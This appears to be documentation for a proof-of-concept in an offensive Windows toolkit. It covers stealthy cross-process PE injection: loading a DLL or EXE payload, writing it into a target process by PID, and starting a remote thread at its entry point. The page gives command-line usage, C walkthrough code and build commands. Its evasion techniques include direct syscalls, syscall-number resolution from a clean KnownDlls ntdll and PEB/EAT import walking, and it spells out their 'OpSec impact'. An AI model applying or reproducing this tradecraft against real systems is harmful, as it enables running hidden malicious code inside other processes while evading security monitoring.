# PoC: inject_pe

**Location:** `pocs/inject_pe/`

Full-stealth classic PE injection. Locally bakes a PE image (relocations + imports), writes it into a remote process, and creates a thread at the remote entry point via `snd_inj_classic_pe`.

## What it demonstrates

- Loader + injection interop (`snd_ldr_pe_ctx_t` + `snd_inj_ctx_t`)
- KnownDlls `ntdll` bootstrap for syscall resolution
- Full `_sys` / `_nt` stealth profile: `snd_mem_sys`, `snd_mod_nt`, `snd_proc_sys`
- Remote thread at PE entry RVA (DllMain address for DLL payloads — not the loader's local DllMain/TLS path)

## Command-line usage

```text
inject_pe -f <payload_path> -p <target_pid>

  -f   Path to PE payload (DLL or EXE)
  -p   Target process ID (decimal)
```

### Example

```bash
inject_pe.exe -f payload.dll -p 5678
```

For DLL payloads, the remote thread starts at `AddressOfEntryPoint` (typically `DllMain`). The classic PE chain does not run local TLS or the loader's typed DllMain invocation — see [injection techniques](../domains/injection/techniques.md).

## Walkthrough

### 1. Load PE from disk

```c
snd_buffer_t     file_buf = {0};
snd_ldr_pe_ctx_t ldr_ctx  = {0};
snd_inj_ctx_t    inj_ctx  = {0};

status = snd_disk_buffer_load(file_path, &file_buf);
ldr_ctx.raw_source = &file_buf;
```

### 2. Bootstrap clean `ntdll` + syscall pipeline

```c
PVOID ntdll = NULL;
status = snd_om_knowndll_map(&snd_map_nt, L"ntdll.dll", &ntdll);
snd_syscall_set_ntdll(ntdll);
snd_syscall_strategy_set(snd_syscall_resolve_ssn_scan);
snd_syscall_strategy_add(snd_syscall_resolve_ssn_sort);
```

### 3. Configure loader and injection contexts

```c
ldr_ctx.mem_api = &snd_mem_sys;   // direct syscalls for local mapping
ldr_ctx.mod_api = &snd_mod_nt;    // PEB + EAT import resolution

inj_ctx.target_pid = target_pid;
inj_ctx.proc_api   = &snd_proc_sys;  // direct syscalls for remote ops
```

### 4. Single chain call

```c
status = snd_inj_classic_pe(&ldr_ctx, &inj_ctx);
```

Internally this interleaves loader fixups with remote allocation:

1. Parse PE, allocate/copy locally
2. Open target, allocate remote RW region
3. Set `execution_base = remote_base`, apply relocations + imports locally
4. Write baked image to remote process
5. Protect remote region RX, set `remote_entry_point` to entry VA
6. Create remote thread

### 5. Cleanup

```c
snd_inj_cleanup(&inj_ctx);
snd_ldr_pe_free_mapped_image(&ldr_ctx);
snd_buffer_free(&file_buf);
```

## What this PoC does *not* do

- No per-section remote protections (flat `PAGE_EXECUTE_READ` on the whole image)
- No TLS callback execution in the injection chain
- No local `snd_ldr_pe_execute_image` — execution is entirely remote

See [injection techniques](../domains/injection/techniques.md) for the full step table.

## Building

```bash
cmake -B build -DSND_BUILD_PAYLOADS=ON
cmake --build build --config Release
```

## OpSec impact

- Local memory: direct syscalls (`snd_mem_sys`)
- Imports: PEB walk + EAT parsing (`snd_mod_nt`)
- Remote ops: direct syscalls (`snd_proc_sys`)
- SSN resolution against KnownDlls-mapped clean `ntdll`

This is the reference stealth profile for cross-process PE injection in SindriKit.

## See also

- [Injection API reference](../domains/injection/api_reference.md)
- [inject_shell.md](inject_shell.md) — simpler shellcode path with Win32 remote APIs
- [loader_nowinapi.md](loader_nowinapi.md) — local-only NT profile
